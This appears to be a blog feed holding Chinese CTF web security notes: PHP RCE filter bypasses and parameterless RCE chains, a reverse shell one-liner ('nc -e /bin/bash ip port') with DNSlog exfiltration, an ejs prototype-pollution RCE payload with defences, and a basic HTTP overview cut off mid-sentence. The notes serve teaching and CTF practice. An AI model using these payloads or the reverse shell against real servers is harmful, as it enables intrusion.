~</h3><p>一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><p>有参数函数要分开运算</p><p>如</p><pre class="language-none"><code class="language-none">system('ls /');(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); </code></pre><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code></p><h3 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h3><p>只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><pre class="language-none"><code class="language-none">&lt;?php$_=[];$_=@"$_"; // $_='Arraycode></pre><p>在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,’’)</p><p>php7特性</p><pre class="language-none"><code class="language-none">&lt;?php'var_dump'('1111'); ("VAR_DUMP")("llll"); echo $_GET[ss];echo $_GET['1'] . '&lt;br/&gt;';echo $_GET[1];$a = '_GET';echo $$a[1];echo `pwd`;</code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a>4.<strong>临时文件</strong></h3><p>利用通配符</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=. /???/????????[@-[];?&gt;</code>，发送数据包如下：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>成功执行任意命令。</p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="language-none"><code class="language-none">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}</code></pre><p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b('111'));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET['code'])){if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}else die('nonono');}else echo('please input code');?&gt; </code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcwZmViOTQ5NjZlYzZkZDdlMjMyNjIyOGQ2M2VjODhfNmFYY2VGZU1oRXFNZXVYMXh2dVRxWGlWQXVybTR1dGxfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY0Yzk0MjA1MWU0MDlhNWMyODAwMTBkZDIyMzEyZTZfTHU0emMxbVBkQXJjMGo4WVhGWVoxOVQ0MDRMZmpKbVpfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyMDRkNmUzOWFjYjMzYzdkOTlmNDJiNWZmZGI1MmNfcjdPTTJNaGRQUnMzQVk5dGF5QlVpN2ZHM1lYN2NlcjJfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyMjlhMDI4YmE1Y2FjNGJhZjlmODNmZTNiZGJhZmZfaFhtY2FKVGx6TzBqVldjc3JMMzFpN3dYdkRsUWhrYW1fVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE3NmU2OTdkM2Y4ODVlMDYwZDFlOTk0YTc3NmRmNzlfUEJkRDBXM1VEdWxpNnhyaHVPMnlZN01xQVlad2ZZVTFfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE2NmNjMmNkMDJmODQ5ODZmN2RmYzQyMzczYzFlMDJfM0xMWHg3OE5xVnVLVmVzc0hNOTNTRlB0WWh4R1UyUDVfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0Yzc3YWEzYTJlOTZlYjE0ZDAwMmFiMTk5ZjFjMjVfNk5pVnRYRzlpTjFvQWFJVG1vY3l2TUxKY0UyQ1hMdUdfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q3MWE2ZDBhYWQ0YTY1NGY2OWIyMGFiYWM5Nzk5MTZfaFFMRmw1NGZBVVNoVzBqcFk3ZkREVXdzWHY1TFQ1dnFfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p><p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhNmMwNTczNTBjYzg1MzYwZmJiMWE4MjJiZWNjNjVfY3dMU2RKR241cFhIZnJpTFZ1YTBQdWdCTmNRcnFVZVdfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUxM2YxNjdiNTc4YjM2MTc3OWUxMDY2YjMxYmQ5NWZfUU1jdjRlVzRlVktzNnFuVmNEYktiOHRkTk1tRGp0Yk9fVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkZmE4MmRmMWM2MTI0NWFjZTU5ZjMyODdkZjljNTVfUkFGQmZJZTJWaDJZNW1JbksyWHpybzNnYlF0WEpnNVRfVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1NDM3ZGZiNDRkYThjZGQ3MzBmNTNiMGFiOTJhMTJfc2FuaTliR0hhNG1YY3dIQ1plTDE4cU5mcWdZZGswSWdfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p><h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU2NDExYzg1OWQ4NTBlYzcyMGVmOGQzYmVmMmMwOTlfbkNuVEc4RFRhdGViTHAyV3lGMWtQV04zOWlVTkFidWpfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBjNWFiZTUxOWRjNTc1ZmY4MWQ0ZjE5NjdkN2NmY2VfZGlrQzFkVFZ2Ykw3Y0FxWUxLS0VNTmNNbHQyTEVDVzdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzMjYwNTQ3OWUyOWRjNzRlZjUyNDc4YThkZGM4NmRfMnd3UFZESXczWVBVT05FbW9RYmxKcFAyUDdBSkRJaGNfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NjY0MzQzYzc3MWY5NmM0YzA1MWI0NWM0MjdkMmJfM2NDekp1RnpVN3p0RWZUd2sxRU5rQlB0NDJ1TFVWM1NfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFiMzQyMzcwMjUzODhlZTQ2YzE4ODdjZTcyZDQ1NzBfazhHb1paS0pwcWdyekd3YW5CTDByWlUwZFFiaXBsbnZfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p><p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI1NjQxZjkzM2U2MWYzZGYyMTdlNWY3MGQ3MjQzYzFfV2lUS1VPVVkzZzl0OUlLN2I2YlFQaUlxVklkOW80WmRfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir('..')</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVkOWYzMWM5ZDE0NzBhYzRhYjdmZDM3OWE5MDM3ZTRfcVJ5R0t2RUtoZ3Z6Q2dJZzRYSWdjU0czb2RsVUFJdU9fVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>条件：具有nc</p><p>命令</p><p> nc -e /bin/bash ip port</p><p>然后再在服务器上开启端口接听</p><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</p><p>然后这里一个dnslog的利用平台：ceye <a href="http://ceye.io/">http://ceye.io/</a></p><p>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令</p><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>特定情况下压缩flag文件,并访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript的原型链污染</title>
      <link href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><h2 id="基础概念辨析"><a href="#基础概念辨析" class="headerlink" title="基础概念辨析"></a>基础概念辨析</h2><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a><strong>原型</strong></h3><p>js中一切皆对象,js的每个对象都有一个属性原型（prototype），原型本身也是一个对象，因此该原型也有一个prototype指向上层原型，直到为null，这样就构成了原型链</p><p>简单来说，原型链是javascript中类继承的一种机制，每个对象都有对应的原型，储存了定义的属性和方法，之中包含了prototype，指向上一级的原型。最上层Object原型中的prototype为null</p><p><strong>特性</strong></p><p>类定义中的属性，会在创建对象时在对象中创建，类定义的方法而是存在于原型之中。当使用没有定义的属性和方法时，就会顺着原型链一直寻找，直到为undefined,用此来实现继承，子类能用父类的属性和方法</p><p>示例</p><pre class="language-none"><code class="language-none">function Person(name) {       this.name = name;   }   Person.prototype.greet = function () {       console.log(`Hello, my name is ${this.name}`);   };   const person1 = new Person('Alice');   person1.greet(); // 输出 "Hello, my name is Alice"</code></pre><p><img src="/./js.jpg" alt="img"></p><p>​<em>person1对象原型对象展示</em></p><p><strong>prototype与__proto__</strong></p><p>(1)所有引用类型（函数，数组，对象）都拥有<code>__proto__</code>属性（隐式原型）,用来查看其原型</p><p>(2)所有函数拥有<code>prototype</code>属性（显式原型）（仅限函数）</p><p> 简单来说，<strong>proto</strong> 属性是指向该对象的原型，而 prototype属性是用于创建该对象的构造函数的原型。</p><h3 id="Function-与function"><a href="#Function-与function" class="headerlink" title="Function 与function"></a>Function 与function</h3><p>function是一个定义函数的关键字，Function是代表所有函数的内置原型对象</p><p>每一个js 的function都是Function对象，Function是js内置对象，用以实现很多基本功能，如Nunmber,toString</p><p>constructor是一个对象数据属性属性,创建对象后，访问constructor属性，可以返回构造该对象的来源（不是该对象的原型链上级）</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>new constructor[([arguments])]</p><p>参数</p><p><code>constructor</code></p><p>一个指定对象实例的类型的类或函数。</p><p>描述</p><p><code>new</code> 关键字会进行如下的操作：</p><ol><li>创建一个空的简单 JavaScript 对象（即 <code>{}</code>）；</li><li>为步骤 1 新创建的对象添加属性 <code>__proto__</code>，将该属性链接至构造函数的原型对象；</li><li>将步骤 1 新创建的对象作为 <code>this</code> 的上下文；</li><li>如果该函数没有返回对象，则返回 <code>this</code>。</li></ol><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当我们添加或者修改上层原型的一些属性，子类都又调用该恶意属性时，子类调用的属性已经被我们篡改，造成原型链污染，原型链污染可能会造成命令执行(rce)或者任意文件读取,越权等等</p><p>示例</p><pre class="language-none"><code class="language-none">function merge(target, source) {      for (let key in source) {          if (key in source &amp;&amp; key in target) {              // 如果target与source有相同的键名 则让target的键值为source的键值              merge(target[key], source[key])          } else {              target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值          }      }  }  let o1 = {}  let o2 = JSON.parse('{ "a": 1, "__proto__": { "b": 2} }');  merge(o1, o2)  console.log(o1.a, o1.b)  o3 = {}  console.log(o3.b)</code></pre><p>漏洞点</p><p>一般对对象进行复制拷贝,如merge函数或者copy函数，会将传入的json数据拷贝至已创建对象，此时可能会产生原型链污染</p><h4 id="ejs模板基于原型链污染的rce"><a href="#ejs模板基于原型链污染的rce" class="headerlink" title="ejs模板基于原型链污染的rce"></a>ejs模板基于原型链污染的rce</h4><p>直接上POC</p><pre class="language-none"><code class="language-none">a; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); //</code></pre><p>参考学习：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>对于<code>toUpperCase()</code>函数</p><pre class="language-none"><code class="language-none">字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"</code></pre><p>对于<code>toLowerCase</code></p><pre class="language-none"><code class="language-none">字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)</code></pre><p>详情可见p神的文章<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com</a></p><p>python中也存在原型链污染</p><p>可参考文章：<a href="https://tttang.com/archive/1876">https://tttang.com/archive/1876</a></p><p>ctf例题：<a href="https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5">https://chenlvtang.top/2021/08/17/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%AE%9E%E8%B7%B5</a></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.Object.freeze()冻结原型</p><pre class="language-none"><code class="language-none">Object.freeze(Object.prototype);Object.freeze(Object)</code></pre><p>冻结原型后，无法添加新的原型至原型链</p><p>2.对JSON输入验证</p><p>npm上有很多库，如avj，可以对JSON数据验证，排除json中数据中不需要的属性</p><p>或者在复制对象时，遍历键名时候，检查__proto__和prototype</p><p>3.使用map代替{}</p><p>4.使用Object.create()安全创建对象</p><p>这样创建的对象没有属性</p><p>5.node.js中可以通过disable-proto直接禁止操作原型链</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http概述</title>
      <link href="/2023/07/20/http%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/07/20/http%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<hr><ul><li><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>​Web 使用一种名为 HTTP（超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流 程。而协议是指规则的约定。Web 是建立在 HTTP 协议上通 信的。 http协议主要是计算机网络系统上的应   用层。</p></li><li><h4 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h4><h5 id="主要内容："><a href="#主要内容：" class="headerlink" title="主要内容："></a>主要内容：</h5></li></ul><pre class="language-none"><code class="language-none">应用层：FTP（文件传输协议）和DNS（域名系统）和http协议传输层：TCP（传输控制协议）和UDP（用户数据报协议）网络层：处理在网络上流动的数据包 链路层：处理连接网络的硬件部分 </code></pre><ul><li><h4 id="IP、TCP和DNS："><a href="#IP、TCP和DNS：" class="headerlink" title="IP、TCP和DNS："></a>IP、TCP和DNS：</h4></li></ul><pre class="language-none"><code class="language-none">**IP**IP地址：指明被分配的地址MAC地址：指网卡所属固定的地址运作方式：利用IP指明目标，中转时利用下一站中转设备的MAC地址搜素下一个中转目标。利用ARP协议可以根据IP地址解析出MAC地址。**TCP**TCP提供字节流服务，把数据分割，并通过带SYN/ACK的数据包（三次）确定是否最终传送到对方。**DNS**提供域名和IP之间解析服务</code></pre><ul><li><h4 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h4><p>​URI：是由某个协议方案表示的资源的定位标识符</p><p>​URL:是使用 Web 浏览器等 访问 Web 页面时需要输入的网页地址 </p><p>​URI格式：协议方案名+登录信息（认证）+服务器地址+服务器端口号+带层次的文件路径+查询字符串+片段标识符如：<a href="http://user:pass@www.example.jp/dir/index.htm?uid=1#ch1">http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1</a></p><p>​</p></li></ul><p></p><h3 id="简单的http协议"><a href="#简单的http协议" class="headerlink" title="简单的http协议"></a>简单的http协议</h3><hr><p>HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。</p><p>​ <strong>请求报文</strong>：主要由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成。</p><p>​<strong>响应报文</strong>：基本由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体构成。 </p><h5 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h5><pre class="language-none"><code class="language-none">**GET: 获取资源**GET方法用来请求访问已被 URI 识别的资源**POST: 传输实体主体****PUT： 传输文件**由于PUT方法自身不带验证机制，存在安全性问题，一般的 Web 网站不使用该方法**HEARD ：获取报文首部**不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等**DELETE： 删除文件****OPTIONS： 查询支持方法**用来查询针对URI指定的资源支持的方法**TRACE: 追踪路径**让 Web 服务器端将之前的请求通信环回给客户端的方法。客户端通过 TRACE 方法可以查询发送出去的请求是怎样被加工修改/篡改的。容易引发XST攻击**CONNECT：要求用隧道协议连接代理**方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（安全套接层）和 